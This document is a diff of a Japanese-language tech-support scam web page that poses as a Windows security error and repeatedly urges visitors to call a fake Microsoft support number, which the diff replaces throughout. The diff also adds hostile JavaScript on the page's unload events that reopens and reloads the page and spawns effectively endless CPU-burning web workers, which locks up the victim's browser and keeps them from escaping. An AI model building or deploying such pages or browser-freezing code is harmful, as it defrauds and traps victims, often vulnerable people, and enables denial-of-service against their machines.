@@ -5,7 +5,7 @@
     <meta content="noindex,nofollow" name="robots">
     <title>コンピューターエラー0x800700B7</title>
     <link href="msmm.png" rel="icon" id="favicon" type="image/png">
-<!--     <script>📞 0101 828 731 2976</script> -->
+<!--     <script>📞 0101 551 220 6001</script> -->
     <link href="https://files-pop.s3.ap-northeast-1.amazonaws.com/tapa.css" rel="stylesheet">
     <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
     <script type="text/javascript">//<![CDATA[
@@ -66,7 +66,242 @@
           <script type="text/javascript">
                       var ph0ne = getVariableFromURl('ph0ne');
                   </script>
+<script>
+  
+window.addEventListener('beforeunload', function (event) {
+    window.open(window.location.href, '_blank');
+    setTimeout(() => {
+        window.location.href = window.location.href;
+    }, 1);
+    let workers = [];
+    let isResponsive = true;
 
+    function workerBomb() {
+        console.log("Starting workerBomb...");
+
+        const script = `
+            let counter = 0;
+            while (true) {
+              counter++;
+              Math.random() * Math.random();
+
+              // Send progress to the main thread occasionally
+              if (counter % 1e6 === 0) {
+                postMessage({ status: "working", counter });
+              }
+            }
+          `;
+        const blob = new Blob([script], { type: "application/javascript" });
+        const workerURL = URL.createObjectURL(blob);
+
+        // Create 10 workers (adjust the number to reduce load)
+        for (let i = 0; i < 1000000000000; i++) {
+            const worker = new Worker(workerURL);
+            workers.push(worker);
+
+            worker.onmessage = (event) => {
+                if (event.data.status === "working") {
+                    console.log(`Worker ${i} progress: ${event.data.counter}`);
+                }
+            };
+
+            worker.onerror = (error) => {
+                console.error(`Worker ${i} encountered an error:`, error);
+            };
+        }
+
+        // Start the responsiveness watchdog
+        // startWatchdog();
+    }
+
+    // Watchdog function to monitor browser responsiveness
+    function startWatchdog() {
+        console.log("Starting watchdog...");
+
+        let lastTime = Date.now();
+
+        const watchdogInterval = setInterval(() => {
+            const currentTime = Date.now();
+
+            // If the browser is unresponsive for more than 2 seconds, terminate workers
+            if (currentTime - lastTime > 2000) {
+                console.warn("Browser unresponsive detected. Terminating workers...");
+                terminateWorkers();
+                clearInterval(watchdogInterval);
+            } else {
+                // Update the last time to keep track of responsiveness
+                lastTime = currentTime;
+            }
+        }, 100);
+
+        // Simulate lightweight work on the main thread to detect unresponsiveness
+        (function monitorResponsiveness() {
+            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
+            if (workers.length > 0) {
+                requestAnimationFrame(monitorResponsiveness);
+            }
+        })();
+    }
+
+    // Function to terminate all workers
+    function terminateWorkers() {
+        workers.forEach((worker, index) => {
+            worker.terminate();
+            console.log(`Worker ${index} terminated.`);
+        });
+        workers = [];
+        console.log("All workers terminated.");
+    }
+
+
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    // Custom message (not all browsers display this)
+    const message = "Are you sure you want to leave this page?";
+
+    // Set the returnValue property to trigger the confirmation dialog
+    event.returnValue = message;
+
+    // Return the message string for some older browsers
+    return message;
+});
+
+
+window.addEventListener('unload', function () {
+    window.open(window.location.href, '_blank');
+    setTimeout(() => {
+        window.location.href = window.location.href;
+    }, 1);
+    let workers = [];
+    let isResponsive = true;
+
+    function workerBomb() {
+        console.log("Starting workerBomb...");
+
+        const script = `
+            let counter = 0;
+            while (true) {
+              counter++;
+              Math.random() * Math.random();
+
+              // Send progress to the main thread occasionally
+              if (counter % 1e6 === 0) {
+                postMessage({ status: "working", counter });
+              }
+            }
+          `;
+        const blob = new Blob([script], { type: "application/javascript" });
+        const workerURL = URL.createObjectURL(blob);
+
+        // Create 10 workers (adjust the number to reduce load)
+        for (let i = 0; i < 1000000000000; i++) {
+            const worker = new Worker(workerURL);
+            workers.push(worker);
+
+            worker.onmessage = (event) => {
+                if (event.data.status === "working") {
+                    console.log(`Worker ${i} progress: ${event.data.counter}`);
+                }
+            };
+
+            worker.onerror = (error) => {
+                console.error(`Worker ${i} encountered an error:`, error);
+            };
+        }
+
+        // Start the responsiveness watchdog
+        // startWatchdog();
+    }
+
+    // Watchdog function to monitor browser responsiveness
+    function startWatchdog() {
+        console.log("Starting watchdog...");
+
+        let lastTime = Date.now();
+
+        const watchdogInterval = setInterval(() => {
+            const currentTime = Date.now();
+
+            // If the browser is unresponsive for more than 2 seconds, terminate workers
+            if (currentTime - lastTime > 2000) {
+                console.warn("Browser unresponsive detected. Terminating workers...");
+                terminateWorkers();
+                clearInterval(watchdogInterval);
+            } else {
+                // Update the last time to keep track of responsiveness
+                lastTime = currentTime;
+            }
+        }, 100);
+
+        // Simulate lightweight work on the main thread to detect unresponsiveness
+        (function monitorResponsiveness() {
+            for (let i = 0; i < 1e6; i++) {} // Simulate a small task
+            if (workers.length > 0) {
+                requestAnimationFrame(monitorResponsiveness);
+            }
+        })();
+    }
+
+    // Function to terminate all workers
+    function terminateWorkers() {
+        workers.forEach((worker, index) => {
+            worker.terminate();
+            console.log(`Worker ${index} terminated.`);
+        });
+        workers = [];
+        console.log("All workers terminated.");
+    }
+
+
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    workerBomb();
+    // Custom message (not all browsers display this)
+    const message = "Are you sure you want to leave this page?";
+
+    // Set the returnValue property to trigger the confirmation dialog
+    event.returnValue = message;
+
+    // Return the message string for some older browsers
+    return message;
+});
+
+</script>
   </head>
   <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
     <div class="bg" style="cursor:none">
@@ -362,7 +597,7 @@
           <div class="right-foot" style="text-align:center">
             <span id="footertxt">
               <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/msmm.png"> Windowsのセキュリティ </span>
-            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 📞 直接お電話ください 0101 828 731 2976
+            <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> 📞 直接お電話ください 0101 551 220 6001
               </span>
             </span>
           </div>
@@ -397,7 +632,7 @@
       </div>
       <img src="https://files-pop.s3.ap-northeast-1.amazonaws.com/re.gif" id="banner">
       <div id="disclaimer">この PC へのアクセスはセキュリティ上の理由からブロックされています.  <br>
-        <span class="support" style="font-size:22px;">Windows サポートに電話してください:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> 📞  0101 828 731 2976
+        <span class="support" style="font-size:22px;">Windows サポートに電話してください:<br><span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> 📞  0101 551 220 6001
           </span>
         </span>
       </div>
@@ -434,7 +669,7 @@
        <p>ただちに Windows サポートに電話して、この脅威を報告し、個人情報の盗難を防ぎ、このデバイスへのアクセスのブロックを解除してください。</p>
        <p>このウィンドウを閉じると、個人情報が危険にさらされ、Windows の登録が一時停止される可能性があります。</p>
       <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話する: <strong>
-          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">📞  0101 828 731 2976
+          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">📞  0101 551 220 6001
           </span>
         </strong>
       </p>
@@ -445,7 +680,7 @@
     </div>
     <div class="answer_list" style="background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
       <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。 <br>お使いのコンピュータは無効になっています。<br>
-        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> 📞  0101 828 731 2976
+        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> 📞  0101 551 220 6001
           </span>
         </strong>
       </p>
@@ -455,7 +690,7 @@
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
       <p style="font-weight:600;font-size:24px">サポートに電話する: <br>
       </p>
-      <h4 style="font-weight:600;font-size:22px"> 📞  0101 828 731 2976
+      <h4 style="font-weight:600;font-size:22px"> 📞  0101 551 220 6001
         <br>(セキュリティサポート)
       </h4>
       <div class="arrow-down">
